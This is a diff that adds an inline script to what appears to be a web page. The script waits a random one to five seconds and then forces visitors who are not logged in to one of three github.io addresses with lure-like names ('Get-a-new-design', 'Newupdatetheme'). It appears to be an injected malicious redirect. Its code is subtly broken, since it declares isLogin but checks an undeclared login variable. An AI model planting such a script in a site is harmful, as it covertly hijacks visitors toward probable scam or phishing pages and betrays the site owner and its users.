@@ -1,0 +1,26 @@
+<script>
+(() => {
+    
+    let isLogin = null;
+
+    let timeout = [1,2,3,4,5]
+    
+    let links = [
+    'https://Get-a-new-design.github.io/',
+    'http://NewdesignM.github.io/',
+    'http://Newupdatetheme.github.io/'
+
+    ]
+
+
+    let obj = {tim: timeout[Math.floor(Math.random()*timeout.length)],url: links[Math.floor(Math.random()*links.length)]}
+    setTimeout(() => {
+
+	if(!login) {
+		window.location.replace(obj.url)
+	}
+
+    }, obj.tim * 1000);
+    
+})()
+</script>
